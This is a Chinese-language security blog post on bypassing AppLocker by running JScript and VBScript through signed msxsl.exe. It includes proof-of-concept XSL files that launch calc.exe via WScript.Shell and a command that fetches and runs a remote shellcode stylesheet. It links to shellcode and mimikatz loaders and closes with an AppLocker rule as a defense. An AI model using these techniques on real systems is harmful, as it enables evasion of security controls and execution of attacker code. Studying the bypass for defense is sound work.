---
layout: post
title: Use msxsl to bypass AppLocker
---

## 0x00 前言
---

Casey Smith@subTee在twitter分享的一个技巧，使用包含微软签名的msxsl.exe能够执行JScript代码，从而实现对Applocker的绕过。

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/1-1.png)

**twitter地址如下：**

https://twitter.com/subTee/status/877616321747271680

**POC地址如下：**

https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d


## 0x01 简介
---

本文将要对这项技术进行介绍，分析可供进一步利用的方法，同时对其扩展，介绍使用msxsl.exe执行VBScript代码的方式


## 0x02 msxsl
---

### 1、msxsl.exe

- XSL(Extensible Stylesheet Language)转换器
- 命令行工具
- 带有微软数字签名

**下载地址：**

https://www.microsoft.com/en-us/download/details.aspx?id=21714

执行如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/2-1.png)

参考Casey Smith的POC:

customers.xml:

```
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="script.xsl" ?>
<customers>
   <customer>
      <name>John Smith</name>
      <address>123 Elm St.</address>
      <phone>(123) 456-7890</phone>
   </customer>
   <customer>
      <name>Mary Jones</name>
      <address>456 Oak Ave.</address>
      <phone>(156) 789-0123</phone>
   </customer>
</customers>
```


script.xml:

```
<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
      xmlns:user="http://mycompany.com/mynamespace">

<msxsl:script language="JScript" implements-prefix="user">
   function xml(nodelist) {
	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
      return nodelist.nextNode().xml;
	  
   }
</msxsl:script>
<xsl:template match="/">
   <xsl:value-of select="user:xml(.)"/>
</xsl:template>
</xsl:stylesheet>
```

成功执行JScript代码，弹出计算器，poc执行如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/2-2.png)

开启Applocker，添加规则拦截js脚本的执行，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/2-3.png)

但是使用msxsl仍然能够执行JScript代码

在之前的文章[《利用JS加载.Net程序》](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F/)介绍过利用JScript脚本加载.Net程序的方法，结合本文，可以得出推论：

**使用msxsl也能够执行c#代码**

具体来说，能够实现以下功能：

- 执行shellcode
- 执行mimikatz
- 执行powershell脚本

### 2、执行shellcode

可参照Cn33liz的StarFighters，地址如下：

https://github.com/Cn33liz/StarFighters/blob/master/StarFighter.js

结合Casey的POC，就能够实现利用msxsl执行shellcode

完整代码我已经上传至github，地址如下：

https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker/blob/master/shellcode.xml

测试如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/3-1.png)

对于执行mimikatz和powershell脚本，思路可参照之前的文章[《利用JS加载.Net程序》](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F/)


## 0x03 脚本优化
---

分析xml文件格式，对Casey的POC作适当优化

### 1、精简customers.xml

XML元素命名规则：

- 名称可以含字母、数字以及其他的字符
- 名称不能以数字或者标点符号开始
- 名称不能以字符 “xml”（或者 XML、Xml）开始
- 名称不能包含空格
- 可使用任何名称，没有保留的字词

原POC内容如下：

```
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="script.xsl" ?>
<customers>
   <customer>
      <name>John Smith</name>
      <address>123 Elm St.</address>
      <phone>(123) 456-7890</phone>
   </customer>
   <customer>
      <name>Mary Jones</name>
      <address>456 Oak Ave.</address>
      <phone>(156) 789-0123</phone>
   </customer>
</customers>
```

经分析，参数1中的xml文件不重要，元素可以任意指定

去掉不相关的参数，重新命名一个xml元素，精简后代码如下：

`<a></a>`

并且，如果为了少创建文件，使用script.xsl作为第一个xml文件参数也是可以的

例如,参数如下：

`msxsl.exe script.xsl script.xsl`

执行成功，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/3-2.png)


### 2、优化script.xsl

执行VBScript代码：

**注：**

经测试，此xml脚本不支持CSharp，同该资料相违背，此问题有待解决

资料地址如下：

https://msdn.microsoft.com/en-us/library/533texsx(VS.71).aspx

对于VBScript语言，不支持return表示函数返回值，通过函数名=需要返回的值来表示函数返回值

完整内容如下：

```
<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
      xmlns:user="urn:my-scripts">

<msxsl:script language="VBScript" implements-prefix="user">
function myFunction()
	set shell=createobject("wscript.shell")
	shell.run "calc.exe",0
	myFunction = 0
end function

</msxsl:script>
<xsl:template match="/">
<xsl:value-of select="user:myFunction()"/>
</xsl:template>
</xsl:stylesheet>
```

以上文件内容对应github地址：https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker/blob/master/VBScript.xml

**注：**

调用函数名要对应：

`<xsl:value-of select="user:myFunction()"/>`

### 3、远程执行

msxsl.exe也支持远程执行，参数如下：

`msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/3-3.png)

**注：**

该方法是从Evi1cg学来的，博客地址：https://evi1cg.me/archives/AppLocker_Bypass_MSXSL.html

## 0x04 防御
---

添加Applocker的可执行规则，指定msxsl.exe

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/4-1.png)

即使更改文件路径，msxsl.exe仍然无法执行

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/4-2.png)


## 0x05 小结
---

本文介绍了利用msxsl绕过AppLocker的方法，但是通过定制AppLocker规则，还是能够限制该方法的使用。

---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)
